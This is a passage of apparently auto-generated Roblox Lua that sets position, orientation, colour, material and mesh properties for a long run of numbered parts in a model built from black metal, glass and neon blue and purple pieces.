Part299.Material = Enum.Material.Metal
Part299.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part299.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part299.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part299.brickColor = BrickColor.new("Really black")
SpecialMesh300.Parent = Part299
SpecialMesh300.Scale = Vector3.new(0.5, 1, 0.400000006)
SpecialMesh300.MeshType = Enum.MeshType.Brick
Part301.Parent = Model0
Part301.CFrame = CFrame.new(-0.60622716, 3.20835805, -17.8265324, -0.999985635, 0.00525827007, -0.00103986717, -0.00513669662, -0.995525479, -0.0943559632, -0.00153136277, -0.0943492651, 0.995538116)
Part301.Orientation = Vector3.new(5.40999985, -0.0599999987, -179.699997)
Part301.Position = Vector3.new(-0.60622716, 3.20835805, -17.8265324)
Part301.Rotation = Vector3.new(5.40999985, -0.0599999987, -179.699997)
Part301.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part301.Velocity = Vector3.new(6.35782698e-08, 0.00245890464, 8.35486958e-07)
Part301.Size = Vector3.new(0.275000006, 0.235124931, 1.6693753)
Part301.Anchored = true
Part301.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part301.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part301.BrickColor = BrickColor.new("Really black")
Part301.CanCollide = false
Part301.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part301.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part301.Material = Enum.Material.Metal
Part301.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part301.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part301.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part301.brickColor = BrickColor.new("Really black")
SpecialMesh302.Parent = Part301
SpecialMesh302.Scale = Vector3.new(0.400000006, 1.04999995, 1)
SpecialMesh302.MeshType = Enum.MeshType.Brick
Part303.Parent = Model0
Part303.CFrame = CFrame.new(-0.610610962, 2.80771255, -13.6187115, -0.999985635, -0.00162816129, -0.00510662561, -0.00513656298, 0.0189460143, 0.999807417, -0.00153109711, 0.999819279, -0.0189541057)
Part303.Orientation = Vector3.new(-88.8799973, -164.919998, -15.1700001)
Part303.Position = Vector3.new(-0.610610962, 2.80771255, -13.6187115)
Part303.Rotation = Vector3.new(-91.0899963, -0.289999992, 179.909988)
Part303.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part303.Velocity = Vector3.new(1.27106944e-07, 0.00246767187, 1.67032101e-06)
Part303.Size = Vector3.new(0.275000006, 0.368124902, 0.378374994)
Part303.Anchored = true
Part303.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part303.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part303.BrickColor = BrickColor.new("Really black")
Part303.CanCollide = false
Part303.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part303.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part303.Material = Enum.Material.Glass
Part303.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part303.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part303.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part303.brickColor = BrickColor.new("Really black")
SpecialMesh304.Parent = Part303
SpecialMesh304.Scale = Vector3.new(0.400000006, 1, 1)
SpecialMesh304.MeshType = Enum.MeshType.Wedge
Part305.Parent = Model0
Part305.CFrame = CFrame.new(-0.608244181, 3.38925195, -17.114748, 0.999985635, 0.00432614516, 0.00316458894, 0.00513666775, -0.942128837, -0.335212082, 0.00153127394, 0.335223496, -0.942137599)
Part305.Orientation = Vector3.new(19.5900002, 179.809998, 179.690002)
Part305.Position = Vector3.new(-0.608244181, 3.38925195, -17.114748)
Part305.Rotation = Vector3.new(160.410004, 0.179999992, -0.25)
Part305.Color = Color3.new(0.0509804, 0.411765, 0.67451)
Part305.Velocity = Vector3.new(3.48947182e-08, 0.00246038754, 4.5855424e-07)
Part305.Size = Vector3.new(0.275000006, 0.35212487, 0.214375019)
Part305.Anchored = true
Part305.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part305.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part305.BrickColor = BrickColor.new("Bright blue")
Part305.CanCollide = false
Part305.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part305.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part305.Material = Enum.Material.Neon
Part305.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part305.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part305.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part305.brickColor = BrickColor.new("Bright blue")
SpecialMesh306.Parent = Part305
SpecialMesh306.Scale = Vector3.new(0.449999988, 0.5, 0.100000001)
SpecialMesh306.MeshType = Enum.MeshType.Brick
Part307.Parent = Model0
Part307.CFrame = CFrame.new(-0.610837221, 3.46367049, -15.6710596, 0.999985635, 0.00347598689, -0.00408008695, 0.00513679162, -0.404108554, 0.914696753, 0.00153067545, -0.914704561, -0.404120624)
Part307.Orientation = Vector3.new(-66.159996, -179.419998, 179.269989)
Part307.Position = Vector3.new(-0.610837221, 3.46367049, -15.6710596)
Part307.Rotation = Vector3.new(-113.839996, -0.229999989, -0.199999988)
Part307.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part307.Velocity = Vector3.new(2.30945076e-08, 0.00246339524, 3.03486615e-07)
Part307.Size = Vector3.new(0.200000003, 0.217000008, 0.200375021)
Part307.Anchored = true
Part307.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part307.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part307.BrickColor = BrickColor.new("Royal purple")
Part307.CanCollide = false
Part307.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part307.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part307.Material = Enum.Material.Neon
Part307.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part307.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part307.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part307.brickColor = BrickColor.new("Royal purple")
SpecialMesh308.Parent = Part307
SpecialMesh308.Scale = Vector3.new(0.560000002, 0.200000003, 0.600000024)
SpecialMesh308.MeshType = Enum.MeshType.Brick
Part309.Parent = Model0
Part309.CFrame = CFrame.new(-0.609296381, 2.72693467, -14.2067709, 0.999985635, -0.00162807154, 0.00510647474, 0.00513641024, 0.0189459547, -0.999807417, 0.00153101049, 0.999819279, 0.0189540461)
Part309.Orientation = Vector3.new(88.8799973, 15.0799999, 15.1700001)
Part309.Position = Vector3.new(-0.609296381, 2.72693467, -14.2067709)
Part309.Rotation = Vector3.new(88.909996, 0.289999992, 0.0899999961)
Part309.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part309.Velocity = Vector3.new(1.39915542e-07, 0.00246644672, 1.83863972e-06)
Part309.Size = Vector3.new(0.275000006, 0.315999985, 0.310375005)
Part309.Anchored = true
Part309.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part309.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part309.BrickColor = BrickColor.new("Really black")
Part309.CanCollide = false
Part309.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part309.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part309.Material = Enum.Material.Glass
Part309.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part309.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part309.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part309.brickColor = BrickColor.new("Really black")
SpecialMesh310.Parent = Part309
SpecialMesh310.Scale = Vector3.new(0.5, 1, 0.5)
SpecialMesh310.MeshType = Enum.MeshType.Wedge
Part311.Parent = Model0
Part311.CFrame = CFrame.new(-0.610869706, 2.96894002, -13.990572, -0.999985635, -0.00162807154, -0.00510650687, -0.00513644237, 0.0189459547, 0.999807417, -0.00153100991, 0.999819279, -0.0189540461)
Part311.Orientation = Vector3.new(-88.8799973, -164.919998, -15.1700001)
Part311.Position = Vector3.new(-0.610869706, 2.96894002, -13.990572)
Part311.Rotation = Vector3.new(-91.0899963, -0.289999992, 179.909988)
Part311.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part311.Velocity = Vector3.new(1.01541801e-07, 0.00246689701, 1.33436765e-06)
Part311.Size = Vector3.new(0.275000006, 0.214124978, 0.205375016)
Part311.Anchored = true
Part311.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part311.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part311.BrickColor = BrickColor.new("Really black")
Part311.CanCollide = false
Part311.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part311.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part311.Material = Enum.Material.Metal
Part311.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part311.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part311.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part311.brickColor = BrickColor.new("Really black")
SpecialMesh312.Parent = Part311
SpecialMesh312.Scale = Vector3.new(0.569999993, 0.75, 0.75)
SpecialMesh312.MeshType = Enum.MeshType.Brick
Part313.Parent = Model0
Part313.CFrame = CFrame.new(-0.610455632, 3.45922971, -15.9053869, 0.999985635, 0.00347598689, -0.00408008695, 0.00513679162, -0.404108554, 0.914696753, 0.00153067545, -0.914704561, -0.404120624)
Part313.Orientation = Vector3.new(-66.159996, -179.419998, 179.269989)
Part313.Position = Vector3.new(-0.610455632, 3.45922971, -15.9053869)
Part313.Rotation = Vector3.new(-113.839996, -0.229999989, -0.199999988)
Part313.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part313.Velocity = Vector3.new(2.37986608e-08, 0.00246290723, 3.12739985e-07)
Part313.Size = Vector3.new(0.200000003, 0.217000008, 0.200375021)
Part313.Anchored = true
Part313.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part313.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part313.BrickColor = BrickColor.new("Royal purple")
Part313.CanCollide = false
Part313.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part313.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part313.Material = Enum.Material.Neon
Part313.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part313.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part313.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part313.brickColor = BrickColor.new("Royal purple")
SpecialMesh314.Parent = Part313
SpecialMesh314.Scale = Vector3.new(0.560000002, 0.200000003, 0.600000024)
SpecialMesh314.MeshType = Enum.MeshType.Brick
Part315.Parent = Model0
Part315.CFrame = CFrame.new(-0.61787647, 3.39316416, -10.8383427, 0.999985635, -0.00162795314, 0.00510659395, 0.00513652712, 0.0189461038, -0.999807417, 0.00153088907, 0.999819279, 0.0189541951)
Part315.Orientation = Vector3.new(88.8799973, 15.0799999, 15.1700001)
Part315.Position = Vector3.new(-0.61787647, 3.39316416, -10.8383427)
Part315.Rotation = Vector3.new(88.909996, 0.289999992, 0.0899999961)
Part315.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part315.Velocity = Vector3.new(3.42744499e-08, 0.00247346424, 4.50402268e-07)
Part315.Size = Vector3.new(0.275000006, 0.578125, 0.234375)
Part315.Anchored = true
Part315.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part315.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part315.BrickColor = BrickColor.new("Really black")
Part315.CanCollide = false
Part315.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part315.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part315.Material = Enum.Material.Metal
Part315.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part315.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part315.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part315.brickColor = BrickColor.new("Really black")
SpecialMesh316.Parent = Part315
SpecialMesh316.Scale = Vector3.new(0.5, 1.04999995, 0.400000006)
SpecialMesh316.MeshType = Enum.MeshType.Brick
Part317.Parent = Model0
Part317.CFrame = CFrame.new(-0.613369107, 3.18659282, -13.087059, -0.999985635, -0.00162807154, -0.00510656228, -0.00513649778, 0.0189459547, 0.999807417, -0.00153100886, 0.999819279, -0.0189540461)
Part317.Orientation = Vector3.new(-88.8799973, -164.919998, -15.1700001)
Part317.Position = Vector3.new(-0.613369107, 3.18659282, -13.087059)
Part317.Rotation = Vector3.new(-91.0899963, -0.289999992, 179.909988)
Part317.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part317.Velocity = Vector3.new(6.70295464e-08, 0.00246877922, 8.8083965e-07)
Part317.Size = Vector3.new(0.275000006, 0.248124972, 0.311374992)
Part317.Anchored = true
Part317.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part317.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part317.BrickColor = BrickColor.new("Really black")
Part317.CanCollide = false
Part317.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part317.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part317.Material = Enum.Material.Metal
Part317.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part317.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part317.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part317.brickColor = BrickColor.new("Really black")
SpecialMesh318.Parent = Part317
SpecialMesh318.Scale = Vector3.new(0.400000006, 1.04999995, 0.5)
SpecialMesh318.MeshType = Enum.MeshType.Brick
Part319.Parent = Model0
Part319.CFrame = CFrame.new(-0.610582829, 3.460711, -15.82728, 0.999985635, 0.00347598689, -0.00408008695, 0.00513679162, -0.404108554, 0.914696753, 0.00153067545, -0.914704561, -0.404120624)
Part319.Orientation = Vector3.new(-66.159996, -179.419998, 179.269989)
Part319.Position = Vector3.new(-0.610582829, 3.460711, -15.82728)
Part319.Rotation = Vector3.new(-113.839996, -0.229999989, -0.199999988)
Part319.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part319.Velocity = Vector3.new(2.35637785e-08, 0.00246306974, 3.09653387e-07)
Part319.Size = Vector3.new(0.200000003, 0.217000008, 0.200375021)
Part319.Anchored = true
Part319.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part319.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part319.BrickColor = BrickColor.new("Royal purple")
Part319.CanCollide = false
Part319.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part319.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part319.Material = Enum.Material.Neon
Part319.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part319.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part319.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part319.brickColor = BrickColor.new("Royal purple")
SpecialMesh320.Parent = Part319
SpecialMesh320.Scale = Vector3.new(0.560000002, 0.200000003, 0.600000024)
SpecialMesh320.MeshType = Enum.MeshType.Brick
Part321.Parent = Model0
Part321.CFrame = CFrame.new(-0.611585259, 3.11314392, -14.0068893, 0.999985635, 0.00162774313, -0.00510693667, 0.00513686566, -0.0189458374, 0.999807417, 0.00153067405, -0.999819279, -0.0189539269)
Part321.Orientation = Vector3.new(-88.8799973, -164.919998, 164.830002)
Part321.Position = Vector3.new(-0.611585259, 3.11314392, -14.0068893)
Part321.Rotation = Vector3.new(-91.0899963, -0.289999992, -0.0899999961)
Part321.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part321.Velocity = Vector3.new(7.86760097e-08, 0.00246686279, 1.03388675e-06)
Part321.Size = Vector3.new(0.275000006, 0.709124923, 0.47437498)
Part321.Anchored = true
Part321.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part321.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part321.BrickColor = BrickColor.new("Really black")
Part321.CanCollide = false
Part321.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part321.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part321.Material = Enum.Material.Metal
Part321.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part321.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part321.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part321.brickColor = BrickColor.new("Really black")
SpecialMesh322.Parent = Part321
SpecialMesh322.Scale = Vector3.new(0.5, 1.04999995, 0.800000012)
SpecialMesh322.MeshType = Enum.MeshType.Brick
Part323.Parent = Model0
Part323.CFrame = CFrame.new(-0.610941768, 3.01069665, -14.083005, -0.999985635, 0.00162795174, 0.00510683283, -0.00513676554, -0.0189458355, -0.999807417, -0.00153088453, -0.999819279, 0.0189539269)
Part323.Orientation = Vector3.new(88.8799973, 15.0799999, -164.830002)
Part323.Position = Vector3.new(-0.610941768, 3.01069665, -14.083005)
Part323.Rotation = Vector3.new(88.909996, 0.289999992, -179.909988)
Part323.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part323.Velocity = Vector3.new(9.49206296e-08, 0.00246670446, 1.24735845e-06)
Part323.Size = Vector3.new(0.275000006, 0.252000004, 0.213375002)
Part323.Anchored = true
Part323.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part323.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part323.BrickColor = BrickColor.new("Really black")
Part323.CanCollide = false
Part323.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part323.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part323.Material = Enum.Material.Metal
Part323.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part323.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part323.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part323.brickColor = BrickColor.new("Really black")
SpecialMesh324.Parent = Part323
SpecialMesh324.Scale = Vector3.new(0.569999993, 0.125, 0.375)
SpecialMesh324.MeshType = Enum.MeshType.Wedge
Part325.Parent = Model0
Part325.CFrame = CFrame.new(-0.61388576, 3.20741606, -12.8194075, -0.999985635, 0.00162786373, 0.00510683237, -0.00513676414, -0.0189461056, -0.999807417, -0.00153079513, -0.999819279, 0.0189541951)
Part325.Orientation = Vector3.new(88.8799973, 15.0799999, -164.830002)
Part325.Position = Vector3.new(-0.61388576, 3.20741606, -12.8194075)
Part325.Rotation = Vector3.new(88.909996, 0.289999992, -179.909988)
Part325.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part325.Velocity = Vector3.new(6.37276969e-08, 0.00246933685, 8.37449761e-07)
Part325.Size = Vector3.new(0.275000006, 0.244125068, 0.416375011)
Part325.Anchored = true
Part325.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part325.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part325.BrickColor = BrickColor.new("Really black")
Part325.CanCollide = false
Part325.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part325.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part325.Material = Enum.Material.Metal
Part325.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part325.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part325.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part325.brickColor = BrickColor.new("Really black")
SpecialMesh326.Parent = Part325
SpecialMesh326.Scale = Vector3.new(0.5, 0.560000002, 0.5)
SpecialMesh326.MeshType = Enum.MeshType.Wedge
Part327.Parent = Model0
Part327.CFrame = CFrame.new(-0.609650612, 3.31554532, -15.9490957, 0.999985635, 0.00326791825, 0.00424884167, 0.00513684331, -0.810688972, -0.585454702, 0.00153127068, 0.585468173, -0.810694098)
Part327.Orientation = Vector3.new(35.8400002, 179.699997, 179.639999)
Part327.Position = Vector3.new(-0.609650612, 3.31554532, -15.9490957)
Part327.Rotation = Vector3.new(144.160004, 0.239999995, -0.189999998)
Part327.Color = Color3.new(0.0509804, 0.411765, 0.67451)
Part327.Velocity = Vector3.new(4.65820733e-08, 0.00246281619, 6.12138422e-07)
Part327.Size = Vector3.new(0.275000006, 0.237124875, 0.214375019)
Part327.Anchored = true
Part327.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part327.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part327.BrickColor = BrickColor.new("Bright blue")
Part327.CanCollide = false
Part327.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part327.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part327.Material = Enum.Material.Neon
Part327.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part327.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part327.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part327.brickColor = BrickColor.new("Bright blue")
SpecialMesh328.Parent = Part327
SpecialMesh328.Scale = Vector3.new(0.449999988, 0.800000012, 0.100000001)
SpecialMesh328.MeshType = Enum.MeshType.Brick
Part329.Parent = Model0
Part329.CFrame = CFrame.new(-0.612260759, 3.04390216, -13.3335075, -0.999985635, -0.00162807154, -0.00510656228, -0.00513649778, 0.0189459547, 0.999807417, -0.00153100886, 0.999819279, -0.0189540461)
Part329.Orientation = Vector3.new(-88.8799973, -164.919998, -15.1700001)
Part329.Position = Vector3.new(-0.612260759, 3.04390216, -13.3335075)
Part329.Rotation = Vector3.new(-91.0899963, -0.289999992, 179.909988)
Part329.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part329.Velocity = Vector3.new(8.96553871e-08, 0.00246826583, 1.17816739e-06)
Part329.Size = Vector3.new(0.275000006, 0.200000003, 0.303375006)
Part329.Anchored = true
Part329.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part329.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part329.BrickColor = BrickColor.new("Really black")
Part329.CanCollide = false
Part329.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part329.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part329.Material = Enum.Material.Metal
Part329.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part329.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part329.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part329.brickColor = BrickColor.new("Really black")
SpecialMesh330.Parent = Part329
SpecialMesh330.Scale = Vector3.new(0.5, 0.5, 0.5)
SpecialMesh330.MeshType = Enum.MeshType.Wedge
Part331.Parent = Model0
Part331.CFrame = CFrame.new(-0.614394248, 3.36069822, -13.0015078, -0.999985635, 0.00245974353, -0.0047620195, -0.00513649127, -0.693573475, 0.72036773, -0.00153088977, 0.720381856, 0.693576157)
Part331.Orientation = Vector3.new(-46.079998, -0.389999986, -179.580002)
Part331.Position = Vector3.new(-0.614394248, 3.36069822, -13.0015078)
Part331.Rotation = Vector3.new(-46.0900002, -0.269999981, -179.860001)
Part331.Color = Color3.new(0.803922, 0.803922, 0.803922)
Part331.Velocity = Vector3.new(3.94224067e-08, 0.00246895733, 5.18052275e-07)
Part331.Size = Vector3.new(0.275000006, 0.216124982, 0.280375004)
Part331.Anchored = true
Part331.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part331.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part331.BrickColor = BrickColor.new("Mid gray")
Part331.CanCollide = false
Part331.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part331.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part331.Material = Enum.Material.Metal
Part331.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part331.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part331.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part331.brickColor = BrickColor.new("Mid gray")
SpecialMesh332.Parent = Part331
SpecialMesh332.Scale = Vector3.new(0.349999994, 1.04999995, 0.5)
SpecialMesh332.MeshType = Enum.MeshType.Brick
Part333.Parent = Model0
Part333.CFrame = CFrame.new(-0.610709965, 3.46219134, -15.7491703, 0.999985635, 0.00347598689, -0.00408008695, 0.00513679162, -0.404108554, 0.914696753, 0.00153067545, -0.914704561, -0.404120624)
Part333.Orientation = Vector3.new(-66.159996, -179.419998, 179.269989)
Part333.Position = Vector3.new(-0.610709965, 3.46219134, -15.7491703)
Part333.Rotation = Vector3.new(-113.839996, -0.229999989, -0.199999988)
Part333.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part333.Velocity = Vector3.new(2.33290489e-08, 0.00246323249, 3.06568751e-07)
Part333.Size = Vector3.new(0.200000003, 0.217000008, 0.200375021)
Part333.Anchored = true
Part333.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part333.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part333.BrickColor = BrickColor.new("Royal purple")
Part333.CanCollide = false
Part333.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part333.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part333.Material = Enum.Material.Neon
Part333.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part333.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part333.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part333.brickColor = BrickColor.new("Royal purple")
SpecialMesh334.Parent = Part333
SpecialMesh334.Scale = Vector3.new(0.560000002, 0.200000003, 0.600000024)
SpecialMesh334.MeshType = Enum.MeshType.Brick
Part335.Parent = Model0
Part335.CFrame = CFrame.new(-0.608794093, 3.33530617, -16.5748692, 0.999985635, -0.0041169636, 0.00343261915, 0.005137017, 0.553175688, -0.83304894, 0.00153079035, 0.833054662, 0.55318886)
Part335.Orientation = Vector3.new(56.4099998, 0.359999985, 0.529999971)
Part335.Position = Vector3.new(-0.608794093, 3.33530617, -16.5748692)
Part335.Rotation = Vector3.new(56.4099998, 0.199999988, 0.239999995)
Part335.Color = Color3.new(0.0509804, 0.411765, 0.67451)
Part335.Velocity = Vector3.new(4.34486722e-08, 0.00246151234, 5.709623e-07)
Part335.Size = Vector3.new(0.275000006, 0.265124857, 0.214375019)
Part335.Anchored = true
Part335.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part335.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part335.BrickColor = BrickColor.new("Bright blue")
Part335.CanCollide = false
Part335.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part335.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part335.Material = Enum.Material.Neon
Part335.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part335.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part335.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part335.brickColor = BrickColor.new("Bright blue")
SpecialMesh336.Parent = Part335
SpecialMesh336.Scale = Vector3.new(0.449999988, 0.899999976, 0.100000001)
SpecialMesh336.MeshType = Enum.MeshType.Brick
Part337.Parent = Model0
Part337.CFrame = CFrame.new(-0.61091727, 3.02827954, -14.1579723, -0.999985635, 0.00162795268, 0.00510695158, -0.00513688475, -0.0189460143, -0.999807417, -0.00153088232, -0.999819279, 0.0189541057)
Part337.Orientation = Vector3.new(88.8799973, 15.0799999, -164.830002)
Part337.Position = Vector3.new(-0.61091727, 3.02827954, -14.1579723)
Part337.Rotation = Vector3.new(88.909996, 0.289999992, -179.909988)
Part337.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part337.Velocity = Vector3.new(9.21325807e-08, 0.00246654823, 1.2107206e-06)
Part337.Size = Vector3.new(0.275000006, 0.207000002, 0.303375006)
Part337.Anchored = true
Part337.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part337.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part337.BrickColor = BrickColor.new("Really black")
Part337.CanCollide = false
Part337.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part337.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part337.Material = Enum.Material.Glass
Part337.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part337.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part337.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part337.brickColor = BrickColor.new("Really black")
SpecialMesh338.Parent = Part337
SpecialMesh338.Scale = Vector3.new(0.524999976, 0.5, 0.5)
SpecialMesh338.MeshType = Enum.MeshType.Wedge
Part339.Parent = Model0
Part339.CFrame = CFrame.new(-0.609729409, 3.2205193, -15.578517, 0.999985635, -0.00133592135, 0.00519115385, 0.00513700396, -0.0377659947, -0.999273479, 0.00153099932, 0.999285877, -0.0377585888)
Part339.Orientation = Vector3.new(87.8199997, 172.169998, 172.25)
Part339.Position = Vector3.new(-0.609729409, 3.2205193, -15.578517)
Part339.Rotation = Vector3.new(92.159996, 0.299999982, 0.0799999982)
Part339.Color = Color3.new(0.0509804, 0.411765, 0.67451)
Part339.Velocity = Vector3.new(6.1649942e-08, 0.00246358826, 8.10146275e-07)
Part339.Size = Vector3.new(0.275000006, 0.621124864, 0.214375019)
Part339.Anchored = true
Part339.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part339.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part339.BrickColor = BrickColor.new("Bright blue")
Part339.CanCollide = false
